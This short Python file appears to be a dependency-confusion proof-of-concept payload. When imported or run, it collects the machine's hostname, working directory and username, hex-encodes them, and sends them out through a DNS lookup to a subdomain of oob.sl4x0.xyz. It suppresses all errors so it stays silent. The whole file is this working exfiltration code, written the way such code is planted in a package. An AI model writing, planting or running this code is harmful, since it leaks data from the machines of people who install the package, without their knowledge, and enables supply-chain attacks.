import socket
import uuid
import os

def exfiltrate():
    try:
        # Gather useful environment info
        hostname = os.uname()[1]
        pwd = os.getcwd()
        user = os.getenv("USER") or os.getenv("USERNAME")
        marker = "sl4x0-python-depconf-test"

        info = f"{hostname}-{pwd}-{user}-{marker}"

        # Make it short and split for DNS
        info_hex = info.encode().hex()[:30]  # Limit size for DNS subdomain

        # Send DNS request (blind OOB)
        socket.gethostbyname(f"{info_hex}.oob.sl4x0.xyz")
    except Exception as e:
        pass

exfiltrate()
